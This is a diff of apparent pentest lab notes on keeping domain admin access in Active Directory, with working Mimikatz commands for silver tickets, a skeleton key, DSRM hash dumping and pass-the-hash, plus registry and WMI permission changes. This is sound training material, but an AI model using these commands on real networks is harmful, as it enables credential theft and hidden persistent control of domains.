@@ -10,7 +10,6 @@ Once we get the domain admin priviledges, how can be make sure to keep those pri
 6. Custom SSP
 7. Domain Persistence using ACLs - AdminSDHolder & Rights Abuser
 8. Persistence using ACLs - Security Descriptors
-9. Persistence using ACLs - Security Descriptors - Remote Registry
 
 We will be exploiting Kerberos for this:
 
@@ -131,7 +130,23 @@ Invoke-Mimikatz -Command '"lsadump:dcsync /user:server1\krbtgt"'
 
 ### Silver Ticket
 
-About silver ticket
+Using hash of the Domain Controller computer account, below command provides access to shares on the DC.
+
+```text
+Invoke-Mimikatz -Command '"kerberos::golden /domain:ps.local /sid:S-1-5-21-2819160440-2435045405-4053789047 /target:WIN-670U2C077D3.server1.ad.local /service:CIFS /rc4:f15df8145bcd62c6493fa8136fdb9a2f /user:Administrator /ptt"'
+```
+
+Below is the breakdown of the various parts of the commands
+
+* Invoke-Mimikatz -Command :- 
+* kerberos::golden :- name of the module \(there is no silver\) 
+* /domain:ps.local :- Domain FQDN 
+* /sid:&lt;&gt; :- SID of the domain
+* /target:&lt;&gt; :- target computer where the service is login
+* /service:CIFS :- Service to which the login is to be done
+* /rc4:&lt;&gt; :- hash of the local admin user of the machine
+* /user:Administrator :- Username for which the TFT is generated 
+* /ptt :- Injects the ticket in current powershell process -no need to save the ticket on the disk
 
 ![](.gitbook/assets/1%20%281%29.png)
 
@@ -143,27 +158,75 @@ About silver ticket
 
 ### Skeleton Key
 
-something about skeleton key
+Skeleton key is a persistence technique where it is possible to patch a Domain Controller \(lsass process\) so that it allows access as any user with a single password. All publicly know methods are NOT persistent across reboots, as the domain controllers are not rebooted frequently. 
+
+Below command to inject a skeleton key \(password would be mimikatz\) on a Domain Controller of choice. DA privileges required
+
+```text
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName WIN-QFAUFPLUUNJ.ps.local
+```
 
 ![](.gitbook/assets/1.png)
 
-![](.gitbook/assets/2-running-the-same-command-results-in-error.png)
+Using the same command again doesn't work and gives error as shown.
+
+![](.gitbook/assets/image%20%2813%29.png)
+
+Now, to access any machine with a valid username and password as "mimikatz".
+
+```text
+Enter-PSSession -Computername WIN-QFAUFPLUUNJ -credential server1\Administrator
+```
 
 ![](.gitbook/assets/3.png)
+
+Now using the command whoami we can check we are logged in as administrator user.
 
 ![](.gitbook/assets/3a.png)
 
 ### DSRM
 
-somethign about DSRM
+DSRM is Directory Services Restore Mode. There is a local administrator on every DC called "Administrator" whose password is the DSRM password. DSRM password \(SafeModePassword\) is required when a server is promoted to Domain Controller and it is rarely changed. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC
+
+Dump DSRM password \(needs DA privs\) using the following command 
+
+```text
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName WIN-QFAUFPLUUNJ
+```
 
 ![Dumping dsrm password](.gitbook/assets/1-dumping-dsrm-password.png)
 
+Dumping the administrative password using the following command, here both dsrm and admin hash are same as I have set same password for admin as well as dsrm.
+
+```text
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName WIN-QFAAUFPLUUNJ
+```
+
 ![Comparing the ntlm hash with the previously ](.gitbook/assets/2-comparing-the-administrator-hash-with-the-one-obtained-previously.png)
+
+Before we can login using the DSRM password hash, we need to change the logon behaviour of the DC usign the following command
+
+```text
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD
+```
 
 ![Adding the new property to change the logon behaviour so that we can use dsrm hash to login](.gitbook/assets/3-chaning-the-logon-behaviour-before-we-can-use-the-hash-obtained-previously-for-logging-at-a-later-stage.png)
 
+To list the newly added property use the following command
+
+```text
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
+```
+
 ![Observe the changed logon behaviour](.gitbook/assets/4-logon-behavioiur-changed.png)
+
+Now to login using the DSRM hash obtained previously, we use the following commands.
+
+```text
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:WIN-670U2C077D3 /user:Administrator /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:powershell.exe"'
+```
+
+with Invoke-Mimikatz I kept getting this error and login wasn't successful.
 
 ![Invoke-Mimikatz giving the same error as in Silver ticket](.gitbook/assets/5-to-login-to-the-domain-controller-using-the-previously-obtained-hash-use-this-command.png)
 
@@ -218,21 +281,33 @@ Get-wmiobject -class win32_operatingsystem -ComputerName WIN-670U2C077D3.server1
 
 ![](.gitbook/assets/image%20%2810%29.png)
 
-To get user persistence with security descriptors, follow the following steps \(assuming admin priviledge is already there\)
+To get user persistence with security descriptors, follow the following steps \(assuming admin priviledge is already there\). Go to the Computer Management -&gt; Services and Applications -&gt; WMI Controls -&gt; Properties.
 
-![](.gitbook/assets/image%20%2813%29.png)
+![](.gitbook/assets/image%20%2814%29.png)
+
+Go to security tab and click security, then click add to add a new user or group for the root namespace.
 
 ![](.gitbook/assets/image%20%289%29.png)
 
-![](.gitbook/assets/image%20%2816%29.png)
+Add the user \(here user3\) and then give it all the permissions and click apply.
+
+![](.gitbook/assets/image%20%2817%29.png)
+
+Now Go to Advanced settings, select user3 under permission entry and click edit, change the applies to to "This namespace and subnamespaces" to give it permission to access
 
 ![](.gitbook/assets/image%20%2811%29.png)
 
-![](.gitbook/assets/image%20%2815%29.png)
+After that, go to Component Services -&gt; Console Root -&gt; Component Services -&gt; Computers -&gt; My Computer \(Properties\). Open tab COM Security and click Edit Limits under Access Permissions and add the user or group \(here we are adding user3\).
+
+![](.gitbook/assets/image%20%2816%29.png)
+
+Add user3 in the Access Permission.
 
 ![](.gitbook/assets/image%20%2812%29.png)
 
-![](.gitbook/assets/image%20%2814%29.png)
+After doing the above steps, observe that user3 is able to access wmi objects and hence, can do commands execution on the machine using various methods involving wmi objects.
+
+![](.gitbook/assets/image%20%2815%29.png)
 
 These things can also be performed using scripts using Set-RemoteWMI.ps1. ACLs can be modified to allow non-admin users access to securable objects. To remove the permission added using the script, 
 
